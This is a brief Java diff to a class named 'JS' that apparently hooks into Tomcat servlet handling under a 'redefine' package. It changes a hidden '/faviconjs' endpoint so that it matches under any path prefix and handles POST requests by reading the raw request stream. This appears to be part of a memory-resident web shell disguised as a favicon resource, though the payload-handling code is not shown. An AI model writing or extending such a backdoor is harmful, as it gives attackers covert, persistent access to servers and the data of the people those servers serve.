@@ -5,7 +5,6 @@ import org.apache.catalina.servlets.redefine.MyResponse;
 import org.apache.catalina.servlets.redefine.MyServletOutputStream;
 
 public class JS {
-    private static final String pathPattern= "/faviconjs";
     private static byte[] r(java.io.InputStream i) {
         byte[] temp = new byte[1024];
         java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
@@ -17,7 +16,7 @@ public class JS {
         return b.toByteArray();
     }
     public static void doService(Object obj, String url,String method, java.io.InputStream in){
-        if (url.matches(pathPattern)){
+        if (url.matches("/(.*)faviconjs")){
             if (method.equals("POST")){
                 java.util.Map objMap = (java.util.Map)obj;
                 Object request = objMap.get("request");
